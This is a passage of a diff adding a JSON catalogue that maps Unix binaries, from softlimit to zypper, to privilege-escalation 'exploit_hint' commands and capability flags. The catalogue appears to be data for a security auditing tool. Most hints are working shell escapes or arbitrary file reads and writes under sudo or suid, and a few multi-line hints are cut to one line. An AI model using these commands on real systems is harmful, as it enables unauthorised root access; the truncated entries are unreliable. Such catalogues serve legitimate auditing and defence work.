+    "sudo": true,
+    "suid": true
+  },
+  "softlimit": {
+    "exploit_hint": "softlimit /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "sort": {
+    "exploit_hint": "echo DATA | sort -m -o /path/to/output-file",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "split": {
+    "exploit_hint": "split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "sqlite3": {
+    "exploit_hint": "sqlite3 /dev/null '.shell /bin/sh'",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "ss": {
+    "exploit_hint": "ss -a -F /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "ssh": {
+    "exploit_hint": "ssh localhost /bin/sh",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "ssh-agent": {
+    "exploit_hint": "ssh-agent /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "ssh-copy-id": {
+    "exploit_hint": "ssh-copy-id -f -i /path/to/input-file.pub -t /path/to/output-file user@host",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "ssh-keygen": {
+    "exploit_hint": "ssh-keygen -D /path/to/lib.so",
+    "file_read": false,
+    "file_write": false,
+    "library_load": true,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "ssh-keyscan": {
+    "exploit_hint": "ssh-keyscan -f /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "sshfs": {
+    "exploit_hint": "echo -e '/bin/sh </dev/tty >/dev/tty 2>/dev/tty' >/path/to/temp-file",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "sshpass": {
+    "exploit_hint": "sshpass /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "sshuttle": {
+    "exploit_hint": "sudo sshuttle -r x --ssh-cmd '/bin/sh -c \"/bin/sh 0<&2 1>&2\"' localhost",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "start-stop-daemon": {
+    "exploit_hint": "start-stop-daemon -S -x /bin/sh -- -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "stdbuf": {
+    "exploit_hint": "stdbuf -i0 /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "strace": {
+    "exploit_hint": "strace -o /dev/null /bin/sh -p",
+    "file_read": false,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "strings": {
+    "exploit_hint": "strings /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "su": {
+    "exploit_hint": "su -c /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "sudo": {
+    "exploit_hint": "sudo /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "sysctl": {
+    "exploit_hint": "sysctl -n \"/../../path/to/input-file\"",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "systemctl": {
+    "exploit_hint": "echo '[Service]",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "systemd-run": {
+    "exploit_hint": "systemd-run -S",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "tac": {
+    "exploit_hint": "tac -s 'RANDOM' /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "tail": {
+    "exploit_hint": "tail -c+0 /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "tar": {
+    "exploit_hint": "tar xf /dev/null -I '/bin/sh -c \"/bin/sh 0<&2 1>&2\"'",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "task": {
+    "exploit_hint": "task execute /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "taskset": {
+    "exploit_hint": "taskset 1 /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "tasksh": {
+    "exploit_hint": "tasksh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "tbl": {
+    "exploit_hint": "tbl /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "tclsh": {
+    "exploit_hint": "tclsh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": true,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "tcpdump": {
+    "exploit_hint": "tcpdump -ln -i lo -w /path/to/output-file -c 1 -Z user",
+    "file_read": false,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "tcsh": {
+    "exploit_hint": "tcsh -b",
+    "file_read": false,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "tdbtool": {
+    "exploit_hint": "tdbtool",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "tee": {
+    "exploit_hint": "echo DATA | tee /path/to/output-file",
+    "file_read": false,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "telnet": {
+    "exploit_hint": "telnet",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "terraform": {
+    "exploit_hint": "terraform console",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "tex": {
+    "exploit_hint": "tex --shell-escape '\\immediate\\write18{/bin/sh}'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "tic": {
+    "exploit_hint": "tic -C /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "time": {
+    "exploit_hint": "time /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "timeout": {
+    "exploit_hint": "timeout 0 /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "tmate": {
+    "exploit_hint": "tmate -c /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "tmux": {
+    "exploit_hint": "tmux -c /bin/sh",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "top": {
+    "exploit_hint": "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "torify": {
+    "exploit_hint": "torify /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "torsocks": {
+    "exploit_hint": "torsocks /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "troff": {
+    "exploit_hint": "troff /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "tsc": {
+    "exploit_hint": "tsc /path/to/input-file.ts --outFile /path/to/output-file",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "ul": {
+    "exploit_hint": "ul /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "unexpand": {
+    "exploit_hint": "unexpand -t999 /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "uniq": {
+    "exploit_hint": "uniq /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "unshare": {
+    "exploit_hint": "unshare -r /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "update-alternatives": {
+    "exploit_hint": "echo DATA >/path/to/temp-file",
+    "file_read": false,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "urlget": {
+    "exploit_hint": "urlget - /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "uuencode": {
+    "exploit_hint": "uuencode /path/to/input-file /dev/stdout | uudecode",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "uv": {
+    "exploit_hint": "uv run /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "valgrind": {
+    "exploit_hint": "valgrind /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "varnishncsa": {
+    "exploit_hint": "varnishncsa -g request -q 'ReqURL ~ \"/xxxxxxxxxx\"' -F '%{yyy}i' -w /path/to/output-file",
+    "file_read": false,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "vi": {
+    "exploit_hint": "vi -c ':set shell=/bin/sh\\ -p | shell'",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "vim": {
+    "exploit_hint": "vim -c ':redir! >/path/to/output-file | echo \"DATA\" | redir END | q'",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "virsh": {
+    "exploit_hint": "echo DATA >/path/to/temp-file",
+    "file_read": false,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "w3m": {
+    "exploit_hint": "w3m -dump /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "wall": {
+    "exploit_hint": "wall --nobanner /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "watch": {
+    "exploit_hint": "watch -x /bin/sh -p -c 'reset; exec /bin/sh -p 1>&0 2>&0'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "wc": {
+    "exploit_hint": "wc --files0-from /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "wg-quick": {
+    "exploit_hint": "cat >/path/to/temp-file.conf <<EOF",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "wget": {
+    "exploit_hint": "echo -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >/path/to/temp-file",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "whiptail": {
+    "exploit_hint": "whiptail --textbox --scrolltext /path/to/input-file 0 0",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "wireshark": {
+    "exploit_hint": "wireshark -c 1 -i lo -k -f 'udp port 12345' &",
+    "file_read": false,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "xargs": {
+    "exploit_hint": "xargs -a /dev/null /bin/sh -p",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "xdg-user-dir": {
+    "exploit_hint": "xdg-user-dir '}; /bin/sh #'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "xdotool": {
+    "exploit_hint": "xdotool exec --sync /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "xmodmap": {
+    "exploit_hint": "xmodmap -v /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "xmore": {
+    "exploit_hint": "xmore /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "xpad": {
+    "exploit_hint": "xpad -f /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "xxd": {
+    "exploit_hint": "echo DATA | xxd | xxd -r - /path/to/output-file",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "xz": {
+    "exploit_hint": "xz -c /path/to/input-file | xz -d",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "yarn": {
+    "exploit_hint": "yarn exec /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "yash": {
+    "exploit_hint": "yash",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "yelp": {
+    "exploit_hint": "yelp man:/path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "yt-dlp": {
+    "exploit_hint": "yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "zathura": {
+    "exploit_hint": "zathura",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "zcat": {
+    "exploit_hint": "zcat -f /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "zgrep": {
+    "exploit_hint": "grep '' /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "zip": {
+    "exploit_hint": "zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "zsh": {
+    "exploit_hint": "zsh",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "zsoelim": {
+    "exploit_hint": "zsoelim /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "zypper": {
+    "exploit_hint": "cp /bin/sh /usr/lib/zypper/commands/zypper-x",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  }
+}
